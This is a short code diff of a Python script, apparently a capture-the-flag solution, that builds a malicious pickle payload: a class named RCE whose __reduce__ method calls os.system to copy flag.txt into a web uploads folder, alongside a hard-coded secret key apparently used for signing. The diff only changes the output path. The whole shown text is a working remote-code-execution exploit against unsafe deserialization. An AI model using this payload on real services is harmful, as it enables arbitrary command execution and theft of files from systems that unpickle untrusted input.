@@ -4,7 +4,7 @@ import pickle, os, hashlib, hmac
 
 class RCE:
     def __reduce__(self):
-        return (os.system, ("cat flag.txt > app/uploads/hacked.txt",))
+        return (os.system, ("cat flag.txt > app/uploads/{your_uuid}/hacked.txt",))
 
 SECRET_KEY = "pickle_tickle"
 payload = pickle.dumps(RCE())
